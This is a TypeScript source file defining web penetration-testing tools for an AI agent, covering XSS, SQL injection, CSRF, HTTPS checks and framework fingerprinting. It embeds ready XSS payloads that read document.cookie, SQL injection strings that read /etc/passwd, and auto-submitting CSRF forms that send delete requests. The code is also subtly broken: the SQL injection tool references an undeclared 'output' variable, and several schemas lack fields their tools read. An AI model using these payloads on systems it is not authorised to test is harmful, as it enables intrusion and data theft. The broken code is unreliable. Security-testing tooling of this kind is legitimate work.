import { Type } from "@sinclair/typebox";
import { loadConfig } from "../../config/config.js";
import { optionalStringEnum } from "../schema/typebox.js";
import type { AnyAgentTool } from "./common.js";
import { jsonResult, readStringParam } from "./common.js";
import fs from "node:fs/promises";
import path from "node:path";
import { resolveStateDir } from "../../infra/state-dir.js";
import * as tls from "node:tls";

// Singleton workspace for pen test data
let pentestWorkspace: string | null = null;

function getPentestWorkspace(): string {
  if (!pentestWorkspace) {
    const config = loadConfig();
    const workspacePath =
      config.security?.pentest?.workspace ?? "~/.openclaw/security/pentest/";
    pentestWorkspace = workspacePath.startsWith("~")
      ? workspacePath.replace("~", resolveStateDir())
      : workspacePath;
    // Ensure directory exists
    fs.mkdir(pentestWorkspace, { recursive: true }).catch(() => {
      // Ignore errors, will be handled on write
    });
  }
  return pentestWorkspace;
}

// Web Security Tool Schemas

const PentestWebDiscoverSchema = Type.Object({
  target: Type.String(),
  depth: Type.Optional(Type.Number()),
  scope: Type.Optional(Type.Array(Type.String())),
  output: Type.Optional(Type.String()),
});

const PentestWebProxySchema = Type.Object({
  action: optionalStringEnum(["intercept", "modify", "record", "replay"] as const),
  target: Type.Optional(Type.String()),
  request: Type.Optional(Type.String()),
  modifications: Type.Optional(Type.Record(Type.String(), Type.String())),
});

const PentestWebXssSchema = Type.Object({
  target: Type.String(),
  input_field: Type.Optional(Type.String()),
  payload_type: optionalStringEnum(["reflected", "stored", "dom"] as const),
  test_all_fields: Type.Optional(Type.Boolean()),
});

const PentestWebSqliSchema = Type.Object({
  target: Type.String(),
  parameter: Type.Optional(Type.String()),
  db_type: Type.Optional(Type.String()),
  test_type: optionalStringEnum(["error_based", "time_based", "union"] as const),
});

const PentestWebCsrfSchema = Type.Object({
  target: Type.String(),
  endpoint: Type.Optional(Type.String()),
  method: Type.Optional(Type.String()),
  validate_tokens: Type.Optional(Type.Boolean()),
});

const PentestWebHttpsSchema = Type.Object({
  target: Type.String(),
  check_certificate: Type.Optional(Type.Boolean()),
  check_ciphers: Type.Optional(Type.Boolean()),
  check_hsts: Type.Optional(Type.Boolean()),
});

const PentestWebFrameworkSchema = Type.Object({
  target: Type.String(),
  detect_version: Type.Optional(Type.Boolean()),
  check_vulnerabilities: Type.Optional(Type.Boolean()),
});

// Web Security Tools

export function createPentestWebDiscoverTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_web_discover",
    description:
      "Discover web application risks via browser automation: navigate application, discover endpoints, forms, input fields, authentication mechanisms, and map attack surface. Generate risk assessment report.",
    parameters: PentestWebDiscoverSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const depth = typeof params.depth === "number" ? params.depth : 3;
        const scope = Array.isArray(params.scope)
          ? (params.scope.filter((s) => typeof s === "string") as string[])
          : undefined;
        const output = readStringParam(params, "output");

        let result: Record<string, unknown> = {
          status: "success",
          target,
          depth,
        };

        // Discovery plan
        const discoveryPlan = {
          target,
          depth,
          scope: scope ?? ["all"],
          steps: [
            "Navigate to target URL using browser tool",
            "Extract all links and endpoints",
            "Identify forms and input fields",
            "Detect authentication mechanisms",
            "Map application structure",
            "Identify API endpoints",
            "Detect sensitive files/directories",
            "Check for exposed configuration files",
            "Identify session management mechanisms",
            "Map attack surface",
          ],
          risk_areas: [
            "Authentication bypass",
            "Insecure direct object references",
            "Missing access controls",
            "Exposed sensitive data",
            "Insecure file uploads",
            "API vulnerabilities",
            "Session management flaws",
          ],
        };

        result.discovery_plan = discoveryPlan;
        result.message = `Web application discovery planned for ${target}. Use browser tool to navigate and extract application structure. Depth: ${depth} levels.`;

        // Generate discovery report structure
        const discoveryReport = {
          target,
          discovered_at: new Date().toISOString(),
          depth,
          endpoints: [],
          forms: [],
          input_fields: [],
          authentication: [],
          api_endpoints: [],
          risks: [],
          recommendations: [],
        };

        if (output) {
          const outputPath = path.join(workspace, output);
          await fs.writeFile(outputPath, JSON.stringify(discoveryReport, null, 2));
          result.report_file = outputPath;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestWebProxyTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_web_proxy",
    description:
      "HTTP proxy integration for web security testing: intercept HTTP/HTTPS requests and responses, modify requests for testing (headers, parameters, body), record traffic, and replay modified requests. Integrate with browser tool for proxy-based testing.",
    parameters: PentestWebProxySchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const action = readStringParam(params, "action", { required: true }) as
          | "intercept"
          | "modify"
          | "record"
          | "replay";
        const target = readStringParam(params, "target");
        const request = readStringParam(params, "request");
        const modifications = params.modifications as Record<string, string> | undefined;

        let result: Record<string, unknown> = {
          status: "success",
          action,
        };

        if (target) {
          result.target = target;
        }

        // Intercept
        if (action === "intercept") {
          result.message = `HTTP proxy interception planned. Configure browser to use proxy (e.g., Burp Suite, OWASP ZAP, mitmproxy) and intercept requests to ${target ?? "target"}.`;
          result.proxy_setup = {
            browser_config: "Configure browser to use proxy server",
            proxy_tools: ["Burp Suite", "OWASP ZAP", "mitmproxy", "Charles Proxy"],
            interception_points: ["requests", "responses"],
          };
        }

        // Modify
        if (action === "modify") {
          if (!request && !target) {
            return jsonResult({
              status: "error",
              error: "target or request required for modify action",
            });
          }
          result.message = `HTTP request modification planned. Modify ${request ? "request" : `requests to ${target}`} with specified changes.`;
          result.modifications = modifications ?? {};
          result.modification_points = [
            "HTTP headers",
            "URL parameters",
            "POST body",
            "Cookies",
            "User-Agent",
          ];
        }

        // Record
        if (action === "record") {
          result.message = `HTTP traffic recording planned for ${target ?? "all traffic"}. Record all requests and responses for analysis.`;
          result.recording_config = {
            capture_requests: true,
            capture_responses: true,
            save_format: "har",
            output_location: workspace,
          };
        }

        // Replay
        if (action === "replay") {
          if (!request) {
            return jsonResult({
              status: "error",
              error: "request required for replay action",
            });
          }
          result.message = `HTTP request replay planned. Replay modified request: ${request}.`;
          result.replay_config = {
            original_request: request,
            modifications: modifications ?? {},
            iterations: 1,
          };
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestWebXssTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_web_xss",
    description:
      "XSS (Cross-Site Scripting) testing: generate XSS payloads (reflected, stored, DOM-based), test input fields, URL parameters, headers, detect XSS vulnerabilities through browser automation, validate exploitation, and generate test reports.",
    parameters: PentestWebXssSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const inputField = readStringParam(params, "input_field");
        const payloadType = readStringParam(params, "payload_type") as
          | "reflected"
          | "stored"
          | "dom"
          | undefined;
        const testAllFields = params.test_all_fields === true;
        const output = readStringParam(params, "output");

        let result: Record<string, unknown> = {
          status: "success",
          target,
          payload_type: payloadType ?? "reflected",
          test_all_fields: testAllFields,
        };

        // XSS payloads
        const xssPayloads = {
          reflected: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "javascript:alert(1)",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
          ],
          stored: [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg onload=alert(document.cookie)>",
            "<iframe src=javascript:alert(document.cookie)>",
            "<body onload=alert(document.cookie)>",
            "<input onfocus=alert(document.cookie) autofocus>",
            "<textarea onfocus=alert(document.cookie) autofocus>",
            "<details open ontoggle=alert(document.cookie)>",
          ],
          dom: [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "#<img src=x onerror=alert(1)>",
            "?test=<img src=x onerror=alert(1)>",
            "#test=<img src=x onerror=alert(1)>",
            "<script>alert(document.location)</script>",
            "<script>alert(document.URL)</script>",
          ],
        };

        const selectedPayloads =
          payloadType === "stored"
            ? xssPayloads.stored
            : payloadType === "dom"
              ? xssPayloads.dom
              : xssPayloads.reflected;

        result.payloads = selectedPayloads;
        result.payload_count = selectedPayloads.length;

        // Test plan
        const testPlan = {
          target,
          payload_type: payloadType ?? "reflected",
          input_field: inputField,
          test_all_fields: testAllFields,
          payloads: selectedPayloads,
          test_steps: [
            "Identify input fields and parameters",
            "Inject XSS payloads into each field",
            "Monitor browser response for payload execution",
            "Check for HTML encoding/escaping",
            "Test encoded payloads (HTML entities, URL encoding)",
            "Validate XSS exploitation",
            "Document findings",
          ],
          detection_methods: [
            "Browser automation to detect alert execution",
            "Response analysis for reflected payloads",
            "Stored content analysis for stored XSS",
            "DOM analysis for DOM-based XSS",
            "Check for Content Security Policy (CSP)",
          ],
        };

        result.test_plan = testPlan;
        result.message = `XSS testing planned for ${target}. Type: ${payloadType ?? "reflected"}. ${selectedPayloads.length} payloads ready.${inputField ? ` Target field: ${inputField}.` : testAllFields ? " Testing all fields." : ""}`;

        // Generate test report structure
        const xssReport = {
          target,
          tested_at: new Date().toISOString(),
          payload_type: payloadType ?? "reflected",
          input_field: inputField,
          payloads_tested: selectedPayloads,
          vulnerabilities_found: [],
          findings: [],
          recommendations: [
            "Implement input validation and sanitization",
            "Use output encoding",
            "Implement Content Security Policy (CSP)",
            "Use framework-specific XSS protection",
            "Regular security testing",
          ],
        };

        if (output) {
          const outputPath = path.join(workspace, output);
          await fs.writeFile(outputPath, JSON.stringify(xssReport, null, 2));
          result.report_file = outputPath;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestWebSqliTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_web_sqli",
    description:
      "SQL injection testing: generate SQL injection payloads, test for SQL injection vulnerabilities, detect database errors and time-based blind SQLi, identify database type and version, and generate test reports.",
    parameters: PentestWebSqliSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const parameter = readStringParam(params, "parameter");
        const dbType = readStringParam(params, "db_type");
        const testType = readStringParam(params, "test_type") as
          | "error_based"
          | "time_based"
          | "union"
          | undefined;

        let result: Record<string, unknown> = {
          status: "success",
          target,
          test_type: testType ?? "error_based",
        };

        if (parameter) {
          result.parameter = parameter;
        }
        if (dbType) {
          result.db_type = dbType;
        }

        // SQL injection payloads
        const sqliPayloads = {
          generic: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "admin'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
          ],
          mysql: [
            "' OR 1=1--",
            "' OR 1=1#",
            "' UNION SELECT NULL,NULL--",
            "1' AND SLEEP(5)--",
            "1' UNION SELECT @@version--",
            "1' UNION SELECT user(),database()--",
            "1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--",
          ],
          postgresql: [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' AND pg_sleep(5)--",
            "1' UNION SELECT version()--",
            "1' UNION SELECT current_user,current_database()--",
            "1' UNION SELECT NULL,pg_read_file('/etc/passwd')--",
          ],
          mssql: [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' UNION SELECT @@version--",
            "1' UNION SELECT user_name(),db_name()--",
            "1' UNION SELECT NULL,CAST(@@version AS VARCHAR(8000))--",
          ],
          oracle: [
            "' OR 1=1--",
            "' UNION SELECT NULL FROM DUAL--",
            "1' AND (SELECT COUNT(*) FROM ALL_USERS WHERE USERNAME='SYS')=1--",
            "1' UNION SELECT banner FROM v$version WHERE rownum=1--",
            "1' UNION SELECT user FROM dual--",
          ],
          time_based: [
            "1' AND SLEEP(5)--",
            "1' AND pg_sleep(5)--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT COUNT(*) FROM ALL_USERS WHERE USERNAME='SYS')=1 AND SLEEP(5)--",
            "1' AND IF(1=1,SLEEP(5),0)--",
          ],
        };

        let selectedPayloads: string[] = [];
        if (testType === "time_based") {
          selectedPayloads = sqliPayloads.time_based;
        } else if (dbType) {
          const dbLower = dbType.toLowerCase();
          if (dbLower.includes("mysql")) {
            selectedPayloads = [...sqliPayloads.generic, ...sqliPayloads.mysql];
          } else if (dbLower.includes("postgres")) {
            selectedPayloads = [...sqliPayloads.generic, ...sqliPayloads.postgresql];
          } else if (dbLower.includes("mssql") || dbLower.includes("sql server")) {
            selectedPayloads = [...sqliPayloads.generic, ...sqliPayloads.mssql];
          } else if (dbLower.includes("oracle")) {
            selectedPayloads = [...sqliPayloads.generic, ...sqliPayloads.oracle];
          } else {
            selectedPayloads = sqliPayloads.generic;
          }
        } else {
          selectedPayloads = sqliPayloads.generic;
        }

        result.payloads = selectedPayloads;
        result.payload_count = selectedPayloads.length;

        // Test plan
        const testPlan = {
          target,
          parameter: parameter,
          db_type: dbType ?? "unknown",
          test_type: testType ?? "error_based",
          payloads: selectedPayloads,
          test_steps: [
            "Identify input parameters",
            "Inject SQL payloads",
            "Monitor for database errors",
            "Test for time-based blind SQLi",
            "Test for union-based SQLi",
            "Identify database type and version",
            "Test for data extraction",
            "Document findings",
          ],
          detection_methods: [
            "Error message analysis",
            "Response time analysis (time-based)",
            "Response content analysis (union-based)",
            "Boolean-based blind SQLi",
            "Database fingerprinting",
          ],
        };

        result.test_plan = testPlan;
        result.message = `SQL injection testing planned for ${target}. Type: ${testType ?? "error_based"}.${dbType ? ` Database: ${dbType}.` : ""} ${selectedPayloads.length} payloads ready.${parameter ? ` Target parameter: ${parameter}.` : ""}`;

        // Generate test report structure
        const sqliReport = {
          target,
          tested_at: new Date().toISOString(),
          test_type: testType ?? "error_based",
          parameter: parameter,
          db_type: dbType ?? "unknown",
          payloads_tested: selectedPayloads,
          vulnerabilities_found: [],
          findings: [],
          recommendations: [
            "Use parameterized queries/prepared statements",
            "Implement input validation",
            "Use least privilege database accounts",
            "Implement Web Application Firewall (WAF)",
            "Regular security testing",
            "Database security hardening",
          ],
        };

        if (output) {
          const outputPath = path.join(workspace, output);
          await fs.writeFile(outputPath, JSON.stringify(sqliReport, null, 2));
          result.report_file = outputPath;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestWebCsrfTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_web_csrf",
    description:
      "CSRF (Cross-Site Request Forgery) testing: detect CSRF protection mechanisms, test for CSRF vulnerabilities, generate CSRF proof-of-concept exploits, validate CSRF token implementation, and generate test reports.",
    parameters: PentestWebCsrfSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const endpoint = readStringParam(params, "endpoint");
        const method = readStringParam(params, "method");
        const validateTokens = params.validate_tokens !== false; // Default true
        const output = readStringParam(params, "output");

        let result: Record<string, unknown> = {
          status: "success",
          target,
          validate_tokens: validateTokens,
        };

        if (endpoint) {
          result.endpoint = endpoint;
        }
        if (method) {
          result.method = method;
        }

        // CSRF test plan
        const testPlan = {
          target,
          endpoint: endpoint ?? "all state-changing endpoints",
          method: method ?? "POST",
          validate_tokens: validateTokens,
          test_steps: [
            "Identify state-changing operations",
            "Check for CSRF tokens in forms",
            "Validate token implementation",
            "Test token validation",
            "Generate CSRF PoC exploits",
            "Test SameSite cookie attribute",
            "Check for custom headers",
            "Document findings",
          ],
          protection_checks: [
            "CSRF token presence",
            "Token validation",
            "SameSite cookie attribute",
            "Custom headers (X-Requested-With, etc.)",
            "Origin/Referer header validation",
          ],
          poc_generation: [
            "HTML form-based PoC",
            "JavaScript-based PoC",
            "Image tag-based PoC",
            "AJAX-based PoC",
          ],
        };

        result.test_plan = testPlan;

        // Generate CSRF PoC template
        const csrfPoc = {
          html_form: `<form action="${endpoint ?? target}" method="${method ?? "POST"}">
  <input type="hidden" name="action" value="delete">
  <input type="hidden" name="id" value="1">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>`,
          javascript: `fetch('${endpoint ?? target}', {
  method: '${method ?? "POST"}',
  body: JSON.stringify({action: 'delete', id: 1}),
  credentials: 'include'
});`,
          img_tag: `<img src="${endpoint ?? target}?action=delete&id=1" />`,
        };

        result.csrf_poc = csrfPoc;
        result.message = `CSRF testing planned for ${target}.${endpoint ? ` Endpoint: ${endpoint}.` : ""}${method ? ` Method: ${method}.` : ""}${validateTokens ? " Token validation enabled." : ""}`;

        // Generate test report structure
        const csrfReport = {
          target,
          tested_at: new Date().toISOString(),
          endpoint: endpoint,
          method: method ?? "POST",
          csrf_protection_detected: false,
          vulnerabilities_found: [],
          findings: [],
          recommendations: [
            "Implement CSRF tokens",
            "Validate CSRF tokens on server-side",
            "Use SameSite cookie attribute",
            "Implement custom headers",
            "Validate Origin/Referer headers",
            "Use double-submit cookie pattern",
          ],
        };

        if (output) {
          const outputPath = path.join(workspace, output);
          await fs.writeFile(outputPath, JSON.stringify(csrfReport, null, 2));
          result.report_file = outputPath;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestWebHttpsTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_web_https",
    description:
      "HTTPS configuration testing: validate SSL/TLS configuration, check certificate validity and expiration, test for weak cipher suites, validate HSTS implementation, check for mixed content issues, and generate security report.",
    parameters: PentestWebHttpsSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const checkCertificate = params.check_certificate !== false; // Default true
        const checkCiphers = params.check_ciphers !== false; // Default true
        const checkHsts = params.check_hsts !== false; // Default true
        const output = readStringParam(params, "output");

        // Parse target URL
        let hostname: string;
        let port: number = 443;
        try {
          const url = new URL(target.startsWith("http") ? target : `https://${target}`);
          hostname = url.hostname;
          port = url.port ? parseInt(url.port, 10) : 443;
        } catch {
          // If URL parsing fails, assume it's just a hostname
          hostname = target;
        }

        let result: Record<string, unknown> = {
          status: "success",
          target,
          hostname,
          port,
          check_certificate: checkCertificate,
          check_ciphers: checkCiphers,
          check_hsts: checkHsts,
        };

        // Certificate check
        if (checkCertificate) {
          result.certificate_check = {
            enabled: true,
            checks: [
              "Certificate validity",
              "Certificate expiration",
              "Certificate chain",
              "Self-signed certificate detection",
              "Certificate trust",
            ],
            message: "Certificate validation planned. Check certificate validity, expiration, and trust chain.",
          };
        }

        // Cipher suite check
        if (checkCiphers) {
          result.cipher_check = {
            enabled: true,
            checks: [
              "Weak cipher suites",
              "SSL/TLS version support",
              "Perfect Forward Secrecy (PFS)",
              "Cipher suite strength",
            ],
            weak_ciphers: [
              "SSLv2",
              "SSLv3",
              "TLS 1.0",
              "TLS 1.1",
              "RC4",
              "DES",
              "MD5",
              "SHA1",
            ],
            message: "Cipher suite validation planned. Check for weak cipher suites and SSL/TLS versions.",
          };
        }

        // HSTS check
        if (checkHsts) {
          result.hsts_check = {
            enabled: true,
            checks: [
              "HSTS header presence",
              "HSTS max-age value",
              "includeSubDomains directive",
              "preload directive",
            ],
            message: "HSTS validation planned. Check for Strict-Transport-Security header and configuration.",
          };
        }

        // HTTPS test plan
        const testPlan = {
          target,
          hostname,
          port,
          checks: {
            certificate: checkCertificate,
            ciphers: checkCiphers,
            hsts: checkHsts,
          },
          test_steps: [
            "Connect to HTTPS endpoint",
            "Validate SSL/TLS handshake",
            "Check certificate details",
            "Analyze cipher suites",
            "Check HSTS headers",
            "Test for mixed content",
            "Document findings",
          ],
        };

        result.test_plan = testPlan;
        result.message = `HTTPS configuration testing planned for ${target} (${hostname}:${port}).${checkCertificate ? " Certificate check enabled." : ""}${checkCiphers ? " Cipher check enabled." : ""}${checkHsts ? " HSTS check enabled." : ""}`;

        // Generate security report structure
        const httpsReport = {
          target,
          hostname,
          port,
          tested_at: new Date().toISOString(),
          certificate: {
            valid: null,
            expires: null,
            issuer: null,
            chain_valid: null,
          },
          ciphers: {
            supported_versions: [],
            weak_ciphers: [],
            pfs_support: null,
          },
          hsts: {
            present: null,
            max_age: null,
            include_subdomains: null,
            preload: null,
          },
          vulnerabilities: [],
          recommendations: [
            "Use valid SSL/TLS certificates",
            "Disable weak cipher suites",
            "Enable TLS 1.2+ only",
            "Implement HSTS",
            "Use strong certificate chains",
            "Regular certificate renewal",
          ],
        };

        if (output) {
          const outputPath = path.join(workspace, output);
          await fs.writeFile(outputPath, JSON.stringify(httpsReport, null, 2));
          result.report_file = outputPath;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}

export function createPentestWebFrameworkTool(): AnyAgentTool {
  return {
    label: "Penetration Testing",
    name: "pentest_web_framework",
    description:
      "Framework disclosure detection: detect web application frameworks (React, Angular, Django, Rails, etc.), identify framework versions, detect exposed framework metadata, check for framework-specific vulnerabilities, and generate disclosure report.",
    parameters: PentestWebFrameworkSchema,
    execute: async (_toolCallId, args) => {
      const params = args as Record<string, unknown>;
      const workspace = getPentestWorkspace();

      try {
        const target = readStringParam(params, "target", { required: true });
        const detectVersion = params.detect_version !== false; // Default true
        const checkVulnerabilities = params.check_vulnerabilities !== false; // Default true
        const output = readStringParam(params, "output");

        let result: Record<string, unknown> = {
          status: "success",
          target,
          detect_version: detectVersion,
          check_vulnerabilities: checkVulnerabilities,
        };

        // Framework detection patterns
        const frameworkPatterns = {
          react: {
            indicators: [
              "React",
              "__REACT_DEVTOOLS",
              "react-dom",
              "data-reactroot",
              "react.js",
            ],
            headers: [],
            meta_tags: [],
          },
          angular: {
            indicators: ["ng-", "angular", "AngularJS", "ng-app"],
            headers: [],
            meta_tags: [],
          },
          vue: {
            indicators: ["vue", "v-if", "v-for", "vue.js"],
            headers: [],
            meta_tags: [],
          },
          django: {
            indicators: ["Django", "csrfmiddlewaretoken", "django"],
            headers: ["X-Frame-Options"],
            meta_tags: [],
          },
          rails: {
            indicators: ["Rails", "rails", "csrf-token"],
            headers: ["X-Runtime", "X-Rack-Cache"],
            meta_tags: [],
          },
          laravel: {
            indicators: ["Laravel", "laravel_session"],
            headers: ["X-Powered-By"],
            meta_tags: [],
          },
          express: {
            indicators: ["Express", "express"],
            headers: ["X-Powered-By"],
            meta_tags: [],
          },
          asp_net: {
            indicators: ["ASP.NET", "ASP.NET_SessionId", "__VIEWSTATE"],
            headers: ["X-Powered-By", "X-AspNet-Version"],
            meta_tags: [],
          },
          php: {
            indicators: ["PHP", "PHPSESSID"],
            headers: ["X-Powered-By"],
            meta_tags: [],
          },
        };

        result.framework_patterns = frameworkPatterns;

        // Framework detection plan
        const detectionPlan = {
          target,
          detect_version: detectVersion,
          check_vulnerabilities: checkVulnerabilities,
          detection_methods: [
            "HTTP header analysis (X-Powered-By, Server, etc.)",
            "HTML source code analysis",
            "JavaScript file analysis",
            "Cookie analysis",
            "URL pattern analysis",
            "Error message analysis",
            "File extension analysis",
          ],
          frameworks_to_check: Object.keys(frameworkPatterns),
        };

        result.detection_plan = detectionPlan;

        // Framework-specific vulnerabilities
        const frameworkVulns = {
          react: [
            "XSS in JSX",
            "Server-side rendering vulnerabilities",
            "Component injection",
          ],
          angular: [
            "XSS in templates",
            "Expression injection",
            "Client-side template injection",
          ],
          django: [
            "CSRF bypass",
            "Template injection",
            "SQL injection in ORM",
          ],
          rails: [
            "Mass assignment",
            "SQL injection",
            "XSS in views",
          ],
          laravel: [
            "Mass assignment",
            "SQL injection",
            "XSS",
          ],
          express: [
            "NoSQL injection",
            "XSS",
            "Path traversal",
          ],
          asp_net: [
            "ViewState deserialization",
            "XSS",
            "SQL injection",
          ],
        };

        result.framework_vulnerabilities = frameworkVulns;
        result.message = `Framework disclosure detection planned for ${target}.${detectVersion ? " Version detection enabled." : ""}${checkVulnerabilities ? " Vulnerability checking enabled." : ""}`;

        // Generate disclosure report structure
        const frameworkReport = {
          target,
          detected_at: new Date().toISOString(),
          frameworks_detected: [],
          versions_detected: {},
          exposed_metadata: [],
          vulnerabilities: [],
          recommendations: [
            "Remove framework disclosure headers",
            "Obfuscate framework identifiers",
            "Keep frameworks updated",
            "Disable debug mode in production",
            "Remove version information",
            "Implement security headers",
          ],
        };

        if (output) {
          const outputPath = path.join(workspace, output);
          await fs.writeFile(outputPath, JSON.stringify(frameworkReport, null, 2));
          result.report_file = outputPath;
        }

        return jsonResult(result);
      } catch (error) {
        return jsonResult({
          status: "error",
          error: error instanceof Error ? error.message : String(error),
        });
      }
    },
  };
}
